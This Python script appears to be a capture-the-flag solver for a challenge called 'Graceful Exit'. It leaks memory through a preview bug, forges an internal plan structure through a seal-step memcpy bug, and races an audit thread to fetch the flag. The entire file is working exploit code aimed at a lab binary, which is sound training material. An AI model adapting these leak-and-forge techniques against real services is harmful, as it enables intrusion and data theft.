#!/usr/bin/env python3
import argparse
import os
import re
import socket
import struct
import subprocess
import sys
import time

SEED0 = 0x714A5C21
CONST = int.from_bytes(b"rog_dees", "little")


def rol32(x, n):
    x &= 0xFFFFFFFF
    return ((x << n) & 0xFFFFFFFF) | (x >> (32 - n))


def frame_crc(seed, hdr, payload):
    hdr = bytearray(hdr[:16])
    hdr[12:16] = b"\x00" * 4
    a = (seed ^ 0xC001CAFE) & 0xFFFFFFFF
    for b in hdr:
        a = rol32(((a ^ b) * 0x45D9F3B) & 0xFFFFFFFF, 7)
    d = (seed ^ 0x5E36B347) & 0xFFFFFFFF
    for b in payload:
        d = rol32(((d ^ b) * 0x45D9F3B) & 0xFFFFFFFF, 7)
    return (a ^ d) & 0xFFFFFFFF


def make_frame(seed, op, payload=b""):
    hdr = bytearray(b"GORF" + struct.pack("<HHI", op, 0, len(payload)) + b"\x00" * 4)
    hdr[12:16] = struct.pack("<I", frame_crc(seed, hdr, payload))
    return bytes(hdr) + payload


def recvn(sock, n):
    out = bytearray()
    while len(out) < n:
        chunk = sock.recv(n - len(out))
        if not chunk:
            raise EOFError("connection closed while reading")
        out += chunk
    return bytes(out)


def read_frame(sock):
    hdr = recvn(sock, 16)
    magic, op, reserved, length, checksum = struct.unpack("<4sHHII", hdr)
    if magic != b"GORF":
        raise ValueError(f"bad frame magic: {magic!r}")
    payload = recvn(sock, length) if length else b""
    return op, payload


def trans(sock, seed, op, payload=b""):
    sock.sendall(make_frame(seed, op, payload))
    return read_frame(sock)


def h32(seed, data):
    a = seed & 0xFFFFFFFF
    for b in data:
        a = rol32(((a ^ b) * 0x45D9F3B) & 0xFFFFFFFF, 7)
    return (a ^ 0xA51C3D29) & 0xFFFFFFFF


def uleb(n):
    if n < 0:
        raise ValueError("uleb cannot encode negative values")
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def sleb(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        sign = b & 0x40
        n >>= 7
        done = (n == 0 and not sign) or (n == -1 and sign)
        if not done:
            b |= 0x80
        out.append(b)
        if done:
            return bytes(out)


def build_gfc(litr=b"A", code=None, syms=None, fixs=None, view=b"\x00"):
    if code is None:
        code = [(0x7F, 0, 0)]
    code_blob = b"".join(
        bytes([op & 0xFF, 0]) + struct.pack("<HI", word & 0xFFFF, dword & 0xFFFFFFFF)
        for op, word, dword in code
    )
    if syms is None:
        syms = [(0, 0, 0)]
    sym_blob = b"".join(sleb(a) + sleb(b) + sleb(c) for a, b, c in syms)
    if fixs is None:
        fixs = [(0, 0, 0, 0)]
    fix_blob = b"".join(uleb(a) + uleb(b) + uleb(c) + sleb(d) for a, b, c, d in fixs)

    sections = [
        (b"LITR", litr, 0),
        (b"CODE", code_blob, len(code)),
        (b"SYMS", sym_blob, len(syms)),
        (b"FIXS", fix_blob, len(fixs)),
        (b"VIEW", view, 0),
    ]
    toc = bytearray()
    body = bytearray()
    off = 0
    for name, data, count in sections:
        toc += name + struct.pack("<III", off, len(data), count)
        body += data
        off += len(data)
    toc_off = 0x18 + len(toc)
    hdr = struct.pack(
        "<4sHHHHIII",
        b"GFC2",
        2,
        toc_off,
        len(sections),
        0,
        len(code),
        h32(0x915589AA, toc),
        h32(0x824E8EA7, body),
    )
    return hdr + bytes(toc) + bytes(body)


def make_leak_capsule():
    # Preview bug: signed relative copy from 32 bytes before the preview output buffer.
    # Leaks rand64, encoded flag pointer, fetch cookie, and flag length/session id.
    view = b"\x11" + sleb(-32) + uleb(32) + b"\x00"
    return build_gfc(view=view)


def make_plan_forge_capsule(cookie, flag_ptr, flag_len):
    # Seal bug: the symbolic summary is memcpy'd into the beginning of the plan
    # after the real plan fields are initialized. One 0x80-byte symbol replaces
    # the whole plan with a fetch-ready fake plan.
    fake = bytearray(0x80)
    fake[0x30:0x38] = struct.pack("<Q", cookie)
    fake[0x38:0x40] = struct.pack("<Q", flag_ptr)
    fake[0x40:0x44] = struct.pack("<I", flag_len)
    fake[0x7C] = 1  # finished

    return build_gfc(
        litr=bytes(fake),
        code=[(0x7F, 0, 0)],
        syms=[(0, 0x80, 0)],
        fixs=[(0, 0, 0, 0)],
        view=b"\x00",
    )


def read_banner(sock):
    sock.settimeout(2.0)
    data = bytearray()
    end_marker = b"8-byte tape ops\n"
    while end_marker not in data and len(data) < 4096:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return bytes(data)


def expect_ok(op, payload, where):
    if op == 0x101:
        raise RuntimeError(f"{where} failed: {payload!r}")
    return payload


def solve(sock, verbose=True):
    banner = read_banner(sock)
    if verbose and banner:
        sys.stderr.write(banner.decode("latin-1", "replace"))

    op, payload = trans(sock, SEED0, 1, b"forge/v2")
    expect_ok(op, payload, "hello")
    m = re.search(rb"nonce=([0-9a-fA-F]{8}) sid=([0-9a-fA-F]{8})", payload)
    if not m:
        raise RuntimeError(f"could not parse hello response: {payload!r}")
    nonce = int(m.group(1), 16)
    sid = int(m.group(2), 16)
    if verbose:
        print(f"[+] nonce=0x{nonce:08x} sid=0x{sid:08x}", file=sys.stderr)

    op, payload = trans(sock, nonce, 2, make_leak_capsule())
    expect_ok(op, payload, "load leak capsule")
    op, leak = trans(sock, nonce, 3, b"")
    if op != 0x102 or len(leak) != 32:
        raise RuntimeError(f"bad preview leak: op=0x{op:x} payload={leak!r}")
    rand, encoded_ptr, cookie, flag_len_sid = struct.unpack("<QQQQ", leak)
    flag_ptr = rand ^ encoded_ptr ^ CONST
    flag_len = flag_len_sid & 0xFFFFFFFF
    leak_sid = (flag_len_sid >> 32) & 0xFFFFFFFF
    if not (1 <= flag_len <= 0x7F):
        raise RuntimeError(f"unexpected flag length: {flag_len}")
    if verbose:
        print(f"[+] cookie=0x{cookie:016x}", file=sys.stderr)
        print(f"[+] flag_ptr=0x{flag_ptr:016x} flag_len={flag_len} leak_sid=0x{leak_sid:08x}", file=sys.stderr)

    op, payload = trans(sock, nonce, 2, make_plan_forge_capsule(cookie, flag_ptr, flag_len))
    expect_ok(op, payload, "load forge capsule")
    if verbose:
        print(f"[+] forge capsule loaded", file=sys.stderr)

    op, payload = trans(sock, nonce, 4, b"")
    expect_ok(op, payload, "audit")
    if verbose:
        print(f"[+] audit started", file=sys.stderr)

    # The detached audit thread has deliberate sleeps. Poll seal until it is approved.
    last_err = None
    for _ in range(20):
        time.sleep(0.12)
        op, payload = trans(sock, nonce, 6, b"")
        if op == 0x100:
            if verbose:
                print(f"[+] plan sealed", file=sys.stderr)
            break
        last_err = payload
        if payload not in (b"audit busy", b"capsule not approved"):
            raise RuntimeError(f"seal failed: {payload!r}")
    else:
        raise RuntimeError(f"seal did not complete, last error: {last_err!r}")

    op, flag = trans(sock, nonce, 8, struct.pack("<Q", cookie))
    if op != 0x102:
        raise RuntimeError(f"fetch failed: op=0x{op:x} payload={flag!r}")
    return flag


def main():
    ap = argparse.ArgumentParser(description="Graceful Exit exploit")
    ap.add_argument("host", nargs="?", default="127.0.0.1")
    ap.add_argument("port", nargs="?", type=int, default=20001)
    ap.add_argument("--local", action="store_true", help="spawn a local challenge binary")
    ap.add_argument("--bin", default="./graceful_exit", help="local binary path")
    ap.add_argument("--cwd", default=None, help="working directory for --local")
    ap.add_argument("--flag", default="FAKEFLAG{graceful_exit_local}", help="FLAG value for --local")
    args = ap.parse_args()

    proc = None
    if args.local:
        cwd = args.cwd or os.path.dirname(os.path.abspath(args.bin)) or "."
        env = dict(os.environ)
        env["FLAG"] = args.flag
        proc = subprocess.Popen([args.bin], cwd=cwd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
        time.sleep(0.2)
        host, port = "127.0.0.1", 20001
    else:
        host, port = args.host, args.port

    try:
        with socket.create_connection((host, port), timeout=5.0) as sock:
            sock.settimeout(5.0)
            flag = solve(sock)
            print(flag.decode("latin-1", "replace"))
    finally:
        if proc is not None:
            proc.terminate()
            try:
                proc.wait(timeout=1)
            except subprocess.TimeoutExpired:
                proc.kill()


if __name__ == "__main__":
    main()
